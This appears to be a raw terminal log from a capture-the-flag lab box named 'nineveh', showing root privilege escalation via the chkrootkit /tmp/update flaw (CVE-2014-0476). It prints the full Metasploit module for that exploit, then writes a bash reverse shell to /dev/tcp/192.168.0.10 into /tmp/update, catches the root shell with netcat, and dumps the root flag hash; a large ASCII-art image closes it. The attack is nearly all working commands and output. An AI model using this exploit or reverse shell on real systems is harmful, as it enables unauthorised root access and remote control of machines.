-rw-r--r-- 1 amrois amrois 4793 Jun 25 20:37 report-18-06-25:20:37.txt
amrois@nineveh:~$ 

amrois@nineveh:~$ less /report/report-18-06-25:20:37.txt
Searching for Romanian rootkit... nothing found
Searching for Suckit rootkit... Warning: /sbin/init INFECTED
Searching for Volc rootkit... nothing found
Searching for Gold2 rootkit... nothing found
Searching for TC2 Worm default files and dirs... nothing found
Searching for Anonoying rootkit default files and dirs... nothing found
Searching for ZK rootkit default files and dirs... nothing found
Searching for ShKit rootkit default files and dirs... nothing found
Searching for AjaKit rootkit default files and dirs... nothing found
Searching for zaRwT rootkit default files and dirs... nothing found
Searching for Madalin rootkit default files... nothing found
Searching for Fu rootkit default files... nothing found
Searching for ESRK rootkit default files... nothing found
Searching for rootedoor... nothing found
Searching for ENYELKM rootkit default files... nothing found
Searching for common ssh-scanners default files... nothing found
----- snip -----

????? chkrootkit running ??????





root@7242-alpha-reticuli:~# searchsploit chkrootkit -w
-------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                                                                    |  URL
-------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                              | https://www.exploit-db.com/exploits/38775/
Chkrootkit 0.49 - Local Privilege Escalation                                                                                                      | https://www.exploit-db.com/exploits/33899/
-------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Result
root@7242-alpha-reticuli:~# curl https://www.exploit-db.com/raw/38775/ --insecure
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit4 < Msf::Exploit::Local

  # This could also be Excellent, but since it requires
  # up to one day to pop a shell, let's set it to Manual instead.
  Rank = ManualRanking

  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Chkrootkit Local Privilege Escalation',
      'Description'    => %q{
        Chkrootkit before 0.50 will run any executable file named
        /tmp/update as root, allowing a trivial privsec.

        WfsDelay is set to 24h, since this is how often a chkrootkit
        scan is scheduled by default.
      },
      'Author'         => [
        'Thomas Stangner',        # Original exploit
        'Julien "jvoisin" Voisin' # Metasploit module
      ],
      'References'     => [
        ['CVE', '2014-0476'],
        ['OSVDB', '107710'],
        ['EDB', '33899'],
        ['BID', '67813'],
        ['CWE', '20'],
        ['URL', 'http://seclists.org/oss-sec/2014/q2/430']
      ],
      'DisclosureDate' => 'Jun 04 2014',
      'License'        => MSF_LICENSE,
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'SessionTypes'   => ['shell', 'meterpreter'],
      'Privileged'     => true,
      'Stance'         => Msf::Exploit::Stance::Passive,
      'Targets'        => [['Automatic', {}]],
      'DefaultTarget'  => 0,
      'DefaultOptions' => {'WfsDelay' => 60 * 60 * 24} # 24h
    ))

    register_options([
      OptString.new('CHKROOTKIT', [true, 'Path to chkrootkit', '/usr/sbin/chkrootkit'])
    ])
  end

  def check
    version = cmd_exec("#{datastore['CHKROOTKIT']} -V 2>&1")

    if version =~ /chkrootkit version 0\.[1-4]/
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    print_warning('Rooting depends on the crontab (this could take a while)')

    write_file('/tmp/update', "#!/bin/sh\n(#{payload.encoded}) &\n")
    cmd_exec('chmod +x /tmp/update')
    register_file_for_cleanup('/tmp/update')

    print_status('Payload written to /tmp/update')
    print_status('Waiting for chkrootkit to run via cron...')
  end

endroot@7242-alpha-reticuli:~# 

----- /TMP/UPDATE ????

amrois@nineveh:~$ echo '#!/bin/bash' >> /tmp/update ; echo 'bash -i >& /dev/tcp/192.168.0.10/31338 0>&1' >> /tmp/update ; chmod 755 /tmp/update
amrois@nineveh:~$ 

PWNED !!!!! ---
20:52:12-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub/secret$ sudo nc -nlvp 31338
listening on [any] 31338 ...

id
connect to [192.168.0.10] from (UNKNOWN) [192.168.0.150] 47016
bash: cannot set terminal process group (18389): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# 
root@nineveh:~# id
uid=0(root) gid=0(root) groups=0(root)
root@nineveh:~# hostname ; uname -a ; id ; cat /root/root.txt
hostname ; uname -a ; id ; cat /root/root.txt
nineveh
Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
uid=0(root) gid=0(root) groups=0(root)
8a2b4956612b485720694fb45849ec3a
root@nineveh:~# ^^ THE HAMBURGLAR ^^  

21:08:03-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ jp2a -f --colors https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShit9Qts6A6qm3ab9jwEktIwV4ydV-2-JgYJ_7HIsD1y3MXmqx
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWN0x:,..                                    .,coxkd:'.               .cOWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNkdc'..                                            ..,:cllol:,..           'cxXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKo,........                                                 .'cdkkxo;.          .c0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWd..........                                                      .':ldo:,.        .xWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXx;............                .......................                 .''..       .oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNx:'.........           ..'',,;;;:::;;;,,,,,,;;;;::;;,...                        .;XMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXxl;......         ..',,,;::clloddxxxxolc:::cccccc::;;,'...                   .c0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0dc............';::;:;'........'',;codxxdolllolcc::;;,''...                  ,lkNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKkl'.,:cclc:;:;;;.                 .,:oodddollccc:;;;,''....                 'lONMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNoclddool:;'.'                         ........',,;;;,,''....                 .:dKWMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWOldxkkxl:;,'.             ..''.                    ...',,'''.....                .,oXMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXdxOOOkxc;;;:.          .:xkkkxo,                        ..'''''.....                .ckWMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWkoO0Okdl::co,          .OWWWXOxOK:       .,:::;,.           .'''''...                   ,o0WMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWxo00Oxocclxl           ,XMWX,  'Kl      oXNWWXOko.           .;;;;'..                      c0WMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0dk0Oxdloodd;          .;xXNkc:od;...  ;NMWx;,cXXl            .,:;;'''.''...                .;0WMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0dOOkxdoddxko.           .';codxddol. 'KWNl. ;KK;             .'':;;;;::::;'..               .lXMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWW0xxkkdooddxxxo;..   ..';oxxxxxkxdollc'.cdOkkkd,               .'::;::::cccc:,.      ..        :NMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0ooooodddxxkkdloxkO0KXX0dllloolccldx:.  ..                 .;,;:::::clllool;........... .....oWMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKdolooddddddoodxkOOO0K0kol:::cccoodOk:.                   ,c::cccc::llodxdl:,'.......    ...:KMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXxllloooooodxdodxkOO00Okxolccccccokkkd:.               .,cc:ccccc:cllloxxdKWNXK0OOkxxxxkk0KNWMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNxllllloodkOxooolldxkOOOkkxxxxxxxkkxkOko:'.    .....',:c:::::cc::cclldkx0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0dlodxOOkkxdddl,....:dxxkOOOOOOkkkxkkxxdoddxxxxxdolcc::;;;,;;::clodxx0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNkddxxxxxxdddxdl,..'dkxdoccodxkkkkkxddoxkkkxxdollc::::;;;;::cloddxOXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkodddxxxxxxxxoc:,,;::.    ....'''',cxxdddolllcc::;;;cxOOOO0KKXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWOooodddddxxkxdlc:,'...    ....',cooxxooollcc:::;;;c0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNOolooodxxkkkxolc::ccccclllloloooodxollccc::;;:lxXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMWWNNNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNOdllooddxkkkxdddddddddooollllllloolcc::::::oKWWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMN0xocc:ccoxk0XNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNk::cloddxxkkkkxxxdddoooolllllllllcccc:;'. .,xKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMWk:;,;;;,,,,,,;coxxxxkO0KWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXx;...,:llooddddddddddoooolllllcccc:;,'.        ;OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMXxc,,,,,,,,,',,,,;;;;;:cox0NMMMMMMMMMMMMMMMMMMMMMMMMMMMWMWWKl,...   .';clllloolllollllllcc::,'...             .;kWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMWXOdoc;,,,'''''',;;;;:;;;;cdONMMMMMMMMMMMMMMMMMMMMMMMWX0d:''......     ..',,,,,'''......                        ;kNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMNX0xc,''',;::::;,,,,,',,ckNMMMMMMMMMMMMMMMMMMMMXo:,,',;,lOko:,. ...                                          cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMNx,''';;;;;,,'''''''',,lKWMMMMMMMMMMMMMMMMMWx;,,,,;;;okxol:,....',;'..                         'oc,..     ,NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,,,,'''''''''','':dKMMMMMMMMMMMMMMMNx:;;,,,,,',,'''',:oxkOOkxddoodko:,.   .,coxkO00ko,.  ;0WNX0OOO0NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMO;,,'''''''''',,,,'''''''';0WMMMMMMMMMMMMNl,,,,,,,,,,,,'':d0NNNXXXXXXXNNWWWWWNKkxXWWWWWWWWWWN0;  ,NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMx,,'''''''''',,,,,'''''''.'c0KXNWMWWMMMWNl',,,,,,,'''',cxXWWWWWWWWWWWWWWWWMMWMMWWWWWWWWWWWWWWWX;  lWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMWd,''''''''''''''''''''''..'oK0KKOd:oWMW0l;,,,,,,'''',lKWMWWWWWWWWWWWMMMWWMMMWWWWWWWMMMMMMMMWWWWO. .lNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMWd;,'''''''....'''''''''...:0KK00d. .kMKc:;',,,,,''.;ONWWMMMMMWMMMMMMMMMMWMMMMMMMMMWMMMMMMMMMMWWNx. .xMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMWx:,,,,,,,,,,,''''.''....'lOKK0kk;   c0l;;,,,,,,'..  ..;cdOXWMMMMMWWWWWWWWMMMMMMMWXKkdolc::::clok0c..'KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMKc;',,,,,,,,,,,''......'xK0K0Ox,     ';;;;;;,,,.          .'lxKNNkolod0WWWMMMWXx;.               ....lWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMWKd;,,'',;;;,'........lOKKKKOd.     .ldxdoc;,,'.              .,:;,,,,;OWWWXx;.                    ...xWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMWKOdlccool;'.     ,OKKKXKkc.      lOkkkkkd:,.                ',,,,,',lKXc.                       .. .OMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMWWOlc::;'..   :x0KKKKKO:       ,OOOOOOO0x' ........        ',,,,,',,'.                             :WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNkc,,'...,lkKK0000kl'       .xKK00000KO:',,,,,;;;,'...   .,,,,,,,,'                              .OMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkddllxKK00Okkkc.        .lox0KXNXKKO;,,,,,,,;;;;,;,,'.',,,,,,,,,.                    ....,:;   :WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWNXK000O00x:.         .ldolloxkOOkc;:,,,,,,,,,,;;;,,,,,,,,,,,,,,.        ..;coxkOkO0XNWWWWN'  .dWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKxddl,            'dkOkxdolol;'c:'...'',,,,;;;;;;;;;;;;;;;;,,.     .dXWWNWWWWWWWWWWMMMK.   .OMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXx'             .,;:lk00K00d,,,,,,,',,,,,;;;;;;;;;;;;;;;;cokk:   .xNNKXWWMMMMMMMWWMMMk     lMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXo.          ,;,,,,;:lodo:,,,,,,,,,,,,;;;;;;;;;;;;;;:d0NWWWWc  lNN0KWWWWMMMMMMMMMMWc     .KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWk'     .;xk:,,,,,;,,,,,',,,,,,,,,,,;;;;;;;;;;,,:kXWWWMWWMN00WN0OKNWWMMMMMMWWWMW0.      oMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXkocc:okOkc,,,,,,,,,,'',,,,,,,,,,,;;;;;;;,;,cxXWWWWMMWWWWWN0ddkk0WWMMWMWWMMMMNc       ,NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKkdooxkc,,,,,,,cld;.'',',,,,,,,,;;;;;;;lkXWWWWMMWMWXOc,.   ,cxXWMWMWXOo:;:l'        xWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWOxOOO:,,,,,,cOOO;..',''',,,,,,;;;;,;xNWWWWWWMWWWk'         ,0WWWMX:      .        ;XMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
21:09:02-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ 
